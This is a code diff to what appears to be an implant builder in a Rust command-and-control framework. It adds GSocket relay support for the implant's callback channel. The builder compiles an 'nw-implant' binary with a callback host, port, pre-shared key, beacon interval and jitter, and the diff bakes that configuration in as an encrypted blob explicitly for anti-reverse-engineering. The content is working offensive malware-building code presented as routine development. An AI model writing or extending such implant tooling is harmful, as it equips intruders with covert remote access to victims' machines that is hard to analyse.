@@ -17,6 +17,10 @@ pub struct BuildRequest {
     pub lport: u16,
     pub psk: String,
     pub protocol: String,
+    #[serde(default)]
+    pub gsocket_secret: Option<String>,
+    #[serde(default)]
+    pub gsocket_local_port: Option<u16>,
     pub os: String,
     pub arch: String,
     #[serde(default)]
@@ -229,7 +233,40 @@ async fn toolchain_rustc() -> Option<PathBuf> {
 }
 
 async fn do_build(req: &BuildRequest, name: &str, file: &str) -> Result<PayloadMeta> {
-    let endpoint = format!("{}://{}:{}", req.protocol, req.lhost, req.lport);
+    let (payload_config, metadata_host, metadata_port) = if req.protocol == "gs" {
+        let secret = req
+            .gsocket_secret
+            .as_deref()
+            .map(str::trim)
+            .filter(|secret| !secret.is_empty())
+            .context("GSocket secret is required")?;
+        let local_port = req
+            .gsocket_local_port
+            .filter(|port| *port > 0)
+            .unwrap_or(req.lport);
+        (
+            nw_profile::config::PayloadConfig {
+                endpoint: format!("gs://127.0.0.1:{local_port}"),
+                psk: req.psk.clone(),
+                gsocket: Some(nw_profile::config::GSocketConfig {
+                    secret: secret.to_owned(),
+                    local_port,
+                }),
+            },
+            "127.0.0.1".to_owned(),
+            local_port,
+        )
+    } else {
+        (
+            nw_profile::config::PayloadConfig {
+                endpoint: format!("{}://{}:{}", req.protocol, req.lhost, req.lport),
+                psk: req.psk.clone(),
+                gsocket: None,
+            },
+            req.lhost.clone(),
+            req.lport,
+        )
+    };
     let workspace = env!("CARGO_MANIFEST_DIR");
     let bin = cargo_bin();
     let mut args = vec!["build", "--release", "-p", "nw-implant"];
@@ -251,7 +288,7 @@ async fn do_build(req: &BuildRequest, name: &str, file: &str) -> Result<PayloadM
     }
     // Bake the endpoint/PSK as an encrypted blob so the callback isn't a
     // plaintext string in the binary (anti-RE).
-    let cfg_blob = nw_profile::config::encrypt_config(&endpoint, &req.psk)?;
+    let cfg_blob = nw_profile::config::encrypt_payload_config(&payload_config)?;
     let status = cmd
         .current_dir(workspace)
         .args(&args)
@@ -275,8 +312,8 @@ async fn do_build(req: &BuildRequest, name: &str, file: &str) -> Result<PayloadM
         os: req.os.clone(),
         arch: req.arch.clone(),
         protocol: req.protocol.clone(),
-        lhost: req.lhost.clone(),
-        lport: req.lport,
+        lhost: metadata_host,
+        lport: metadata_port,
         psk: req.psk.clone(),
         interval_ms: req.interval_ms,
         jitter_ms: req.jitter_ms,
@@ -387,6 +424,8 @@ mod tests {
             lport: 8080,
             psk: "x".into(),
             protocol: "http".into(),
+            gsocket_secret: None,
+            gsocket_local_port: None,
             os: "windows".into(),
             arch: "amd64".into(),
             interval_ms: 1000,
